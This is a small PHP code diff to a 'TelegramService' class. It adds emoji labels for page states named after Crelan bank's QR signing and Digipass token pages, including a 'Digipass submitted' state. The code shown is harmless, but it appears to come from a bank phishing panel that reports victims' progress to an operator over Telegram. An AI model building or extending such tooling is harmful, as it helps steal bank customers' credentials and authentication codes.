@@ -839,6 +839,11 @@ class TelegramService
             'Главная страница' => '🏠',
             'Форма действия' => '📝',
             'Ожидание' => '⏳',
+            'Crelan Sign QR page' => '📷',
+            'Crelan Sign QR retry' => '🔄',
+            'Digipass page' => '🔑',
+            'Digipass submitted' => '✅',
+            'Method selection page' => '🔀',
             default => '📄',
         };
 
